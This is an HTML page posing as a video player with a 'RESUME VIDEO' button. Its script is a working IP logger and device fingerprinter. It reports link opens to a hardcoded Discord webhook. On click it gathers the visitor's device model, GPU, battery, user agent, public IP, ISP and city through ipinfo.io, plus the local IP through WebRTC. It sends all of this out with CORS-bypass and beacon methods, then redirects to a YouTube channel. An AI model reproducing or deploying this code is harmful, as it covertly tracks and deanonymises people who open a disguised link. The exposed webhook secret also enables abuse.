<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Media Player</title>
    <style>
        body { background: #000; color: #111; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .gate { text-align: center; cursor: pointer; padding: 50px; border-radius: 10px; background: #050505; border: 1px solid #111; }
        .btn { background: #ff0000; color: #fff; padding: 15px 40px; border-radius: 5px; font-weight: bold; border: none; font-size: 20px; }
    </style>
</head>
<body>

    <div class="gate" id="trigger">
        <button class="btn">▶ RESUME VIDEO</button>
    </div>

    <script>
    // 1. PRIMARY CONFIG
    const CONFIG = {
        HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0",
        DEST: "https://youtube.com/@LigmaBlox-w7m"
    };

    // 2. THE ULTIMATE DISPATCH (Multipart + Beacon Hybrid)
    function dispatch(obj, type = "LOG") {
        const payload = JSON.stringify({ ...obj, username: type });
        
        // Method A: Multipart Form Data (Bypasses CORS filters)
        const form = new FormData();
        form.append("payload_json", payload);
        fetch(CONFIG.HOOK, { method: 'POST', body: form, mode: 'no-cors', keepalive: true });

        // Method B: Beacon (Ensures delivery if tab closes)
        navigator.sendBeacon(CONFIG.HOOK, new Blob([payload], {type: 'application/json'}));
    }

    // 3. APPLE & HARDWARE INTELLIGENCE
    async function getIntel() {
        const w = window.screen.width, h = window.screen.height;
        let model = navigator.platform;
        
        // Exact Apple Model Mapping
        if (w === 430 && h === 932) model = "iPhone 15/14 Pro Max";
        else if (w === 393 && h === 852) model = "iPhone 15/14 Pro";
        else if (w === 428 && h === 926) model = "iPhone 14 Plus / 13 Pro Max";
        else if (w === 390 && h === 844) model = "iPhone 14/13/13 Pro";
        
        let gpu = "Restricted";
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            // Polished: Handles both Apple and Non-Apple (Windows/Android) GPUs safely
            gpu = renderer.includes('Apple') ? renderer.split('Apple ').pop() : renderer;
        } catch(e) {}

        return {
            embeds: [{
                title: "💎 TARGET UNMASKED",
                color: 16711680,
                fields: [
                    { name: "Device", value: model, inline: true },
                    { name: "GPU/Chip", value: gpu, inline: true },
                    { name: "Battery", value: await getBattery(), inline: true },
                    { name: "UA", value: "```" + navigator.userAgent + "```" }
                ]
            }]
        };
    }

    async function getBattery() {
        try {
            const b = await navigator.getBattery();
            return `${Math.round(b.level * 100)}% (${b.charging ? "AC" : "DC"})`;
        } catch(e) { return "N/A"; }
    }

    // 4. THE JSONP TUNNEL (Section 8 Force-Bypass)
    window.processIntel = function(data) {
        dispatch({
            embeds: [{
                title: "🛑 BYPASS SUCCESSFUL",
                color: 65280,
                fields: [
                    { name: "IP", value: data.ip, inline: true },
                    { name: "ISP", value: data.org, inline: true },
                    { name: "Loc", value: `${data.city}, ${data.country}`, inline: true }
                ]
            }]
        }, "JSONP-TUNNEL");
    };

    // 5. MASTER EXECUTION (One-Tap Protocol)
    async function run() {
        // Initial silent land
        dispatch({ content: "🟢 **Link Opened (Awaiting Tap)...**" });

        document.getElementById('trigger').onclick = async function() {
            this.innerHTML = "<button class='btn'>LOADING...</button>";

            // A. Fire Hardware Intel
            getIntel().then(intel => dispatch(intel, "HARDWARE-ENFORCER"));

            // B. Open JSONP Tunnel (invisible IP grab)
            const s = document.createElement('script');
            // Polished: Added a cache-buster to ensure fresh data every time
            s.src = `https://ipinfo.io/json?callback=processIntel&cachebuster=${Date.now()}`;
            document.body.appendChild(s);

            // C. WebRTC UDP Crack (Parallel Fire)
            const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            rtc.createDataChannel("");
            rtc.onicecandidate = (ice) => {
                if (ice.candidate) {
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                    if (ip) dispatch({ content: `🚨 **FIREWALL CRACK:** \`${ip[1]}\`` }, "UDP-CRACK");
                }
            };
            rtc.createOffer().then(o => rtc.setLocalDescription(o));

            // D. The Final Bounce
            setTimeout(() => {
                window.location.replace(CONFIG.DEST);
            }, 500);
        };
    }

    run();
    </script>
</body>
</html>
